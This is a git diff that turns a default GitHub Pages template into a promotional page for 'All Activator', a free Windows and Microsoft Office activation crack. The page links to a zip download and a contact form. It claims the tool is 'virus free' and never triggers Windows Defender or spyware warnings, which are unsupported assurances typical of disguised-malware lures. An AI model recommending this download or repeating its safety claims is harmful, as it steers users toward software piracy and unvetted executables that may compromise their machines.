@@ -1,37 +1,22 @@
-## Welcome to GitHub Pages
+## All Activator
 
-You can use the [editor on GitHub](https://github.com/bd-crackers/final/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+"All Activator" is an open source project which can automatically activate your "Windows" PC or Laptop without turning off the "Windows Defender" .  
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+this tool is better then "KMS Auto" . It will never show you the "Spyware notification" .
 
-### Markdown
+# Key Features:
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+1. Can Activate "Windows 7" "Windows 8" "Windows 8" "Windows 8.1" "Windows 10" & "Windows 11".
+2. Also can activate "Microsoft Office" from "2013 to latest"
+3. Free to use.
+4. Virus free
+5. No need to turn off "Windows Defender".
+6. Fast & easy.
 
-```markdown
-Syntax highlighted code block
+# Download The Official Release:
 
-# Header 1
-## Header 2
-### Header 3
+[Click Here To download](https://github.com/bd-crackers/All-Activator/releases/download/v4.4-alpha/All.Activator.zip)
 
-- Bulleted
-- List
+# Contact me:
 
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/bd-crackers/final/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+[Click Here](https://docs.google.com/forms/d/e/1FAIpQLSeBt9Qem3-AS7kZ-vO7ryWGEJ0QNjfBNJHCwM3zF0SRTPLxmA/viewform?usp=sf_link)
